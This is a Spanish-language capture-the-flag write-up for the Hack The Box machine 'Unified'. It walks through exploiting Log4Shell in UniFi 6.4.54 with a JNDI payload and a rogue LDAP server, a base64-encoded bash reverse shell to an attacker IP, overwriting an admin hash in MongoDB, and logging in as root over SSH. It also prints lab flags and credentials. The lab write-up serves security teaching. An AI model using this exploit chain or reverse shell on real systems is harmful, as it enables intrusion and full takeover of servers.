---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/Unified
dificultad: Fácil
os: Linux
relacionados:
  - "[[Log4J]]"
  - "[[tcpdump]]"
  - "[[Burpsuite]]"
  - "[[wireshark]]"
  - "[[base64]]"
  - "[[mkpasswd]]"
---
# HackTheBox - Unified 

## Reconocimiento

### Enumeración

Comienzo escaneando la dirección IP objetivo para identificar los puertos abiertos y los servicios que se ejecutan en ellos. 

```bash\
sudo nmap -sVC -T4 -Pn --open -p- <IP_OBJETIVO> -oN ./fullscan
```

- `-sC`: Realiza un escaneo de scripts usando el conjunto por defecto.
- `-sV`: Detecta las versiones de los servicios.
- `T4`: Define el timing template de nmap.
- `Pn`: Omite el escaneo previo de ping.
- `--open`: Solo muestra los puertos que están abiertos.
- `-p-`: Escanea todos los puertos (de 1 a 65535). Esto asegura que se investiguen todos los puertos, no solo los más comunes.
- `-oN ./fullscan`: Guarda los resultados del escaneo en un archivo de texto plano. El formato de salida es normal (-oN), y el archivo se llamará fullscan en el directorio actual (./).

**Resultados del Escaneo:**

- **Puerto 22:** SSH
- **Puerto 6789:** ibm-db2-admin
- **Puerto 8080:** HTTP Proxy
- **Puerto 8443:** SSL Web Server ejecutando "UniFi Network" versión **6.4.54**

**Conclusión del Reconocimiento:**

Al identificar el puerto 8443 con la aplicación "UniFi Network" versión 6.4.54, investigo su vulnerabilidad conocida **CVE-2021-44228 (Log4J)**, lo que me permitirá proceder con la explotación.

### Búsqueda

Al entrar en la web pruebo usuarios y contraseñas típicos, alguna inyección SQL, y nada en ambos casos. También pruebo usar el comando `searchsploit unifi 6` junto a la versión que aparece en el login de la web. Al no encontrar suficiente información pongo `unifi 6.4.54` en google. 

___

## Análisis de Vulnerabilidades

### Identificación y Comprensión de CVE-2021-44228 ([[Log4J]])

La vulnerabilidad **Log4J (CVE-2021-44228)** permite la inyección de comandos del sistema operativo a través de la manipulación de entradas logueadas por la biblioteca Log4J. En este caso, UniFi versión 6.4.54 está afectada, lo que nos brinda una vía para comprometer la aplicación y, por ende, el sistema.

**Investigación de la Vulnerabilidad:**

1. **Acceso a la Página Web:**
   - Navego a `https://<IP_OBJETIVO>:8443` y observo la página de login de UniFi.
   - La versión **6.4.54** es susceptible a la vulnerabilidad Log4J, permitiendo la ejecución remota de comandos.

2. **Comprensión de JNDI:**
   - **JNDI (Java Naming and Directory Interface)** es una API que permite a las aplicaciones localizar recursos y objetos en redes distribuidas.
   - **LDAP (Lightweight Directory Access Protocol)** se utiliza para acceder y mantener servicios de directorio distribuidos.

3. **Plan de Ataque:**
   - Inyectar una carga útil en el parámetro `remember` de una solicitud POST para explotar la vulnerabilidad Log4J.
   - Configurar un servidor LDAP malicioso para ejecutar una reverse shell hacia nuestra máquina.

___

## Explotación de Vulnerabilidades

### Configuración del Entorno de Ataque

1. **Instalación de Apache Maven y Open-JDK:**
   ```bash
   sudo apt-get update
   sudo apt-get install maven openjdk-11-jdk -y
   ```
   - **Apache Maven:** Herramienta de gestión y comprensión de proyectos Java.
   - **Open-JDK:** Kit de desarrollo de Java necesario para compilar y ejecutar aplicaciones Java.

2. **Clonación y Construcción de Rogue-JNDI:**
   ```bash
   git clone https://github.com/veracode-research/rogue-jndi.git
   cd rogue-jndi
   mvn package
   ```
   - Esto generará el archivo `.jar` en `rogue-jndi/target/RogueJndi-1.1.jar`.

### Interceptación y Modificación de Solicitudes con [[Burpsuite]]

1. **Configuración de BurpSuite con FoxyProxy:**
   - Configuro rl navegador para que todo el tráfico pase a través de BurpSuite utilizando FoxyProxy.
   - Inicio BurpSuite y me dirijo al módulo **Proxy** > **Intercept** > **Open Browser**.

2. **Captura de la Solicitud de Login:**
   - Intento iniciar sesión con credenciales dummy, por ejemplo, `test:test`.
   - BurpSuite interceptará la solicitud, la cual puedo enviar al módulo **Repeater** presionando `Ctrl+R`.

### Inyección de la Carga Útil (Payload)

1. **Construcción del Payload:**

   Debido a que los datos POST se envían como un objeto JSON y la carga útil contiene llaves `{}`, es necesario encerrar la carga dentro de comillas para que sea interpretada como una cadena.

   ```json
   "remember": "${jndi:ldap://<TU_IP_TUN0>/whatever}"
   ```

2. **Envío del Payload:**
   - Modifico el campo `remember` con el payload anterior.
   - Envío la solicitud desde BurpSuite.
   - Aunque la respuesta indique un error (`api.err.InvalidPayload`), la carga útil se ejecuta en el servidor.

3. **Verificación de la Vulnerabilidad:**

   Utilizo [[tcpdump]] para monitorear las conexiones LDAP en el puerto 389 (este es el puerto por defecto que usa LDAP).

   ```bash
   sudo tcpdump -i tun0 port 389
   ```

   - **Explicación del Comando:**
     - `sudo`: Ejecuta el comando con privilegios de administrador.
     - `tcpdump`: Herramienta de análisis de paquetes de red.
     - `-i tun0`: Selecciona la interfaz de red `tun0`.
     - `port 389`: Filtra el tráfico del puerto LDAP estándar.

   - **Resultado Esperado:**
     - Observo una conexión entrante en el puerto 389, confirmando que la aplicación es vulnerable.

>[!TIP]
>Otra opción para hacer el escaneo es usar [[wireshark]] y poner `tcp.port==389`

### Obtención de la Reverse Shell

1. **Codificación del Payload de Reverse Shell:**
   ```bash
   echo 'bash -c "bash -i >& /dev/tcp/<IP_TUN0>/<PUERTO> 0>&1"' | base64
   ```

   - **Ejemplo:**
     - Usando el puerto `4444`:
     ```bash
     echo 'bash -c "bash -i >& /dev/tcp/10.10.14.33/4444 0>&1"' | base64
     ```
     - Resultado:
     ```
     YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMy80NDQ0NCAwPiYxIg==
     ```

2. **Inicio del Servidor Rogue-JNDI:**
   ```bash
   java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMy80NDQ0NCAwPiYxIg==}|{base64,-d}|{bash,-i}" --hostname "<IP_TUN0>"
   ```

   - **Explicación de Parámetros:**
     - `--command`: Define el comando que se ejecutará cuando se reciba una conexión.
     - `--hostname`: Especifica la dirección IP del servidor LDAP malicioso.

3. **Configuración del Listener con Netcat:**

   En otra terminal, inicio un listener para capturar la reverse shell.
   ```bash
   nc -lvnp 4444
   ```

4. **Envío de la Solicitud Modificada:**

   Vuelvo a BurpSuite y envío la solicitud con el payload modificado:
   ```json
   "remember": "${jndi:ldap://<TU_IP_TUN0>:1389/o=tomcat}"
   ```
   - **Resultado Esperado:**
     - Tras unos segundos, debería recibir una shell interactiva en Netcat.

5. **Mejora de la Shell:**

   Para obtener una shell interactiva más funcional, ejecuto:
   ```bash
   python -c 'import pty; pty.spawn("/bin/bash")'
   ```
   - **Nota:** Si Python no está instalado, puedo intentar con otras técnicas de mejora de shell, como usar `python3` o emplear scripts en Perl.

___
## Escalada de Privilegios

### Acceso a la Base de Datos MongoDB

1. **Identificación del Servicio MongoDB:**

   En la shell obtenida, verifico si MongoDB está corriendo y en qué puerto:
   ```bash
   ps aux | grep mongo
   ```

   - **Resultado Esperado:**
     - MongoDB está corriendo en el puerto `27117`.

2. **Interacción con la Base de Datos:**

   Me conecto a MongoDB y enumero las bases de datos disponibles:
   ```bash
   mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
   ```

   - **Explicación del Comando:**
     - `--port 27117`: Especifica el puerto donde está corriendo MongoDB.
     - `ace`: Nombre de la base de datos por defecto en UniFi.
     - `--eval`: Ejecuta el comando proporcionado en la shell de MongoDB.

   - **Resultado Esperado:**
     - Se revela un usuario llamado `Administrator` con un hash de contraseña en el campo `x_shadow`.

### Cambio de la Contraseña del Administrador

1. **Generación de un Nuevo Hash SHA-512:**

   Utilizo [[mkpasswd]] para crear un hash de la nueva contraseña.
   ```bash
   mkpasswd -m sha-512 Password1234
   ```

   - **Resultado Ejemplo:**
     ```
     $6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XXM8P5Z8j4NB1gJGTONl1
     ```

   - **Explicación:**
     - `$6$` indica que se utilizó el algoritmo SHA-512.
     - El resto del hash incluye el **salt** y el valor hash generado.

2. **Actualización del Hash en MongoDB:**

   Ejecuto el siguiente comando para actualizar el hash de la contraseña del administrador:
   ```bash
   mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")}, {$set: {"x_shadow": "$6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XXM8P5Z8j4NB1gJGTONl1"}})'
   ```
   - **Explicación del Comando:**
     - `{"_id": ObjectId("61ce278f46e0fb0012d47ee4")}`: Identifica el documento específico del administrador.
     - `{$set: {"x_shadow": "<NUEVO_HASH>"}}`: Actualiza el campo `x_shadow` con el nuevo hash generado.

3. **Verificación de la Actualización:**

   ```bash
   mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
   ```
   - Confirma que el hash de la contraseña ha sido actualizado correctamente.

4. **Acceso al Panel de Administración:**

   - Navego a `https://<IP_OBJETIVO>:8443` e inicia sesión como `administrator` con la nueva contraseña `Password1234`.
   - Dentro del panel de administración, voy a **Settings** > **Site** y me desplazo hasta **SSH Authentication**.
   - Observo que la contraseña SSH está en texto plano: `NotACrackablePassword4U2022`.

### Acceso como Root vía SSH

1. **Conexión SSH:**

   Desde tu máquina local, me conecto al objetivo utilizando SSH:
   ```bash
   ssh root@<IP_OBJETIVO>
   ```

   - **Contraseña:** `NotACrackablePassword4U2022`

2. **Obtención de la Flag Root:**

   Una vez autenticado como root, navego al directorio `/root` y leo el archivo de la flag:
   ```bash
   cat /root/<nombre_del_archivo_flag>
   ```

___

## Bandera(s)

> [!FLAG] Usuario
> 6ced1a6a89e666c0620cdb10262ba127
^bandera

> [!FLAG] Admin
> 
^bandera